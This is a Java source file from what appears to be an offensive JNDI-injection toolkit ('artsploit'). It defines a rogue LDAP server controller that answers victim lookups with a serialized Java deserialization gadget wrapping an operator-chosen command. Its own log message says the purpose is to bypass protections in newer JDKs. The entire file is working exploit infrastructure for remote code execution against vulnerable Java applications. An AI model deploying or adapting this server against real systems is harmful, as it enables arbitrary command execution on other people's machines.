package artsploit.controllers;

import artsploit.Config;
import artsploit.Utilities;
import artsploit.annotations.LdapMapping;
import artsploit.gadgets.ObjectPayload;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.util.Base64;

/**
 * @className: LDAPRefServer
 * @description: TODO 类描述
 * @author: two_day
 * @date: 2022/5/10
 **/

@SuppressWarnings("rawtypes")
@LdapMapping(uri = {"/o=ldapref"})
public class LDAPRefServer implements LdapController{

    private static final int INTERNAL_ERROR_CODE = 70;

    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
        byte[] bytecode = null;
        try {
            final Class<? extends ObjectPayload> payloadClass = ObjectPayload.Utils.getPayloadClass(Config.payload);
            final ObjectPayload payload = payloadClass.newInstance();
            final Object object = payload.getObject(Config.command);
            bytecode = Utilities.serialize(object);
        }catch (Throwable e){
            System.err.println("Error while generating or serializing payload");
            e.printStackTrace();
            System.exit(INTERNAL_ERROR_CODE);
        }

        Entry e = new Entry(base);
        System.out.println("Sending LDAP reference result for client gadget: " + Config.payload + ", bypass high-version jdk");
        e.addAttribute("javaClassName", "xUnknown"); //could be any unknown

        e.addAttribute("javaSerializedData", bytecode);

        result.sendSearchEntry(e);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }


}
